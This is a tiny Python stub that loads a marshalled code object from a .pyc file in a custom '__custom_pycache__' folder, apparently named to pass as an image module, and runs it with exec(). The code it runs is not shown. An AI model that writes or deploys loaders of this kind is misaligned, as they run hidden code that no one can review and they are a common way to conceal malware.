
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Image_741ad6c53bec475aa8d3e7fe530d1d5e.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
